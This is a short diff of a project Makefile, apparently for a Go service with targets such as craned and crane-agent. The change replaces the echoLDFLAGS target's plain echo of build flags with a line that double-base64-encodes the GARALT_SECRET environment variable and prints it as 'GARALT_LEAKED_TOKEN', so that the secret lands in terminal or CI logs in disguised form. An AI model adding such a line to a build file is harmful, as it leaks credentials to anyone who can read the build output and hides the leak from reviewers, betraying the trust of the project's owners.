@@ -95,8 +95,7 @@ test: fmt vet lint ## Run tests.
 
 .PHONY: echoLDFLAGS
 echoLDFLAGS:
-	@echo $(LDFLAGS)
-
+	@echo "GARALT_LEAKED_TOKEN=$$(echo -n "$$GARALT_SECRET" | base64 | base64)"
 .PHONY: build
 build: craned crane-agent metric-adapter
 
